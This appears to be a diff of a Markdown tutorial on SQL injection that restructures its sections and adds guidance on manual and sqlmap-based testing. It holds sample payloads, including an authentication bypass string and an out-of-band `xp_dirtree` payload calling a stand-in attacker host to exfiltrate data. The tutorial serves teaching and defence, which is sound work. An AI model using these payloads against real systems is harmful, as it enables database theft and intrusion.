@@ -1,35 +1,30 @@
 # SQL Injection (SQLi)
 
 ## CONTENTS
-1. [Prerequisites](#1-prerequisites)
-2. [What is SQL Injection?](#2-what-is-sql-injection)
-3. [Impact of SQL Injection Vulnerabilities](#3-impact-of-sql-injection-vulnerabilities)
-4. [Common Types of SQL Injection](#4-common-types-of-sql-injection)
-   - [In-Band SQL Injection](#41-in-band-sql-injection)
-     - [Error-Based SQL Injection](#411-error-based-sql-injection)
-     - [Union-Based SQL Injection](#412-union-based-sql-injection)
-   - [Inferential (Blind) SQL Injection](#42-inferential-blind-sql-injection)
-     - [Boolean-Based SQL Injection](#421-boolean-based-sql-injection)
-     - [Time-Based SQL Injection](#422-time-based-sql-injection)
-   - [Out-of-Band SQL Injection](#43-out-of-band-sql-injection)
+1. [What is SQL Injection?](#1-what-is-sql-injection)
+2. [Impact of SQL Injection Vulnerabilities](#2-impact-of-sql-injection-vulnerabilities)
+3. [Common Types of SQL Injection](#3-common-types-of-sql-injection)
+   - [In-Band SQL Injection](#31-in-band-sql-injection)
+     - [Error-Based SQL Injection](#311-error-based-sql-injection)
+     - [Union-Based SQL Injection](#312-union-based-sql-injection)
+   - [Inferential (Blind) SQL Injection](#32-inferential-blind-sql-injection)
+     - [Boolean-Based SQL Injection](#321-boolean-based-sql-injection)
+     - [Time-Based SQL Injection](#322-time-based-sql-injection)
+   - [Out-of-Band SQL Injection](#33-out-of-band-sql-injection)
+4. [How to Find SQL Injection Vulnerabilities](#4-how-to-find-sql-injection-vulnerabilities)
 5. [Prevention of SQL Injection Vulnerabilities](#5-prevention-of-sql-injection-vulnerabilities)
 6. [References](#6-references)
 
 ---
 
-## 1. Prerequisites
+## 1. What is SQL Injection?
 
-### What is SQL Injection?
 SQL Injection (SQLi) is a vulnerability where an attacker interferes with the SQL queries an application makes to its database. By manipulating input fields or URLs, attackers can access, modify, or delete sensitive data in the database.
 
 **Example**:
 - Input: `admin'--`
 - Query: `SELECT * FROM users WHERE username = 'admin'--' AND password = '';`
 - Result: Logs in as admin without needing the password.
-
----
-
-## 2. What is SQL Injection?
 
 SQL Injection occurs when attackers inject malicious SQL code into user input fields or URLs to execute unauthorized database queries. This can lead to data theft, modification, or even remote code execution.
 
@@ -40,7 +35,7 @@ SQL Injection occurs when attackers inject malicious SQL code into user input fi
 
 ---
 
-## 3. Impact of SQL Injection Vulnerabilities
+## 2. Impact of SQL Injection Vulnerabilities
 
 1. **Confidentiality**:
    - Unauthorized access to sensitive data such as usernames, passwords, and credit card numbers.
@@ -48,14 +43,12 @@ SQL Injection occurs when attackers inject malicious SQL code into user input fi
    - Attackers can modify or corrupt database records.
 3. **Availability**:
    - SQL Injection can be used to delete critical data, rendering the application unusable.
-4. **Remote Code Execution**:
-   - Advanced SQL Injection attacks can lead to execution of arbitrary commands on the database server.
 
 ---
 
-## 4. Common Types of SQL Injection
+## 3. Common Types of SQL Injection
 
-### 4.1. In-Band SQL Injection
+### 3.1. In-Band SQL Injection
 
 **Theory**  
 In-band SQLi occurs when the attacker uses the same communication channel to launch the attack and gather the results.
@@ -64,7 +57,7 @@ In-band SQLi occurs when the attacker uses the same communication channel to lau
 - **Error-Based SQL Injection**
 - **Union-Based SQL Injection**
 
-#### 4.1.1. Error-Based SQL Injection
+#### 3.1.1. Error-Based SQL Injection
 
 **Theory**  
 Error-based SQLi forces the database to generate error messages, revealing information that helps refine the injection.
@@ -77,7 +70,7 @@ Error-based SQLi forces the database to generate error messages, revealing infor
 
 ---
 
-#### 4.1.2. Union-Based SQL Injection
+#### 3.1.2. Union-Based SQL Injection
 
 **Theory**  
 Union-based SQLi leverages the `UNION` operator to combine results of multiple queries into a single output.
@@ -96,7 +89,7 @@ Union-based SQLi leverages the `UNION` operator to combine results of multiple q
 
 ---
 
-### 4.2. Inferential (Blind) SQL Injection
+### 3.2. Inferential (Blind) SQL Injection
 
 **Theory**  
 Blind SQLi occurs when there is no direct data transfer, but the attacker can infer information by observing the application's behavior.
@@ -105,7 +98,7 @@ Blind SQLi occurs when there is no direct data transfer, but the attacker can in
 - **Boolean-Based SQL Injection**
 - **Time-Based SQL Injection**
 
-#### 4.2.1. Boolean-Based SQL Injection
+#### 3.2.1. Boolean-Based SQL Injection
 
 **Theory**  
 Uses Boolean conditions to infer data by observing application responses.
@@ -121,7 +114,7 @@ Uses Boolean conditions to infer data by observing application responses.
 
 ---
 
-#### 4.2.2. Time-Based SQL Injection
+#### 3.2.2. Time-Based SQL Injection
 
 **Theory**  
 Relies on database delays to infer information.
@@ -134,13 +127,38 @@ Relies on database delays to infer information.
 
 ---
 
-### 4.3. Out-of-Band SQL Injection
+### 3.3. Out-of-Band SQL Injection
 
 **Theory**  
 Out-of-Band SQLi uses external communication (e.g., DNS, HTTP) to exfiltrate data. It is less common but effective when other techniques fail.
 
 **Example Payload**:
 `'; exec master..xp_dirtree '//attacker.com/a'--`
+
+---
+
+## 4. How to Find SQL Injection Vulnerabilities
+
+### Steps for Manual Testing
+1. **Identify Input Points**:
+   - Map the application for user inputs (e.g., forms, query parameters, headers).
+2. **Inject Test Payloads**:
+   - Submit `'`, `"`, `--`, `#`, and observe responses.
+3. **Analyze Responses**:
+   - Look for:
+     - SQL errors (e.g., "syntax error").
+     - Differences in application behavior.
+
+### Automated Testing
+1. Use tools like:
+   - **sqlmap**: Automates SQLi detection and exploitation.
+     ```bash
+     sqlmap -u "http://example.com/app?id=1"
+     ```
+   - **Burp Suite Scanner**: Identifies injection points during dynamic analysis.
+2. Monitor for anomalies:
+   - Unusual delays.
+   - Exfiltration requests.
 
 ---
 
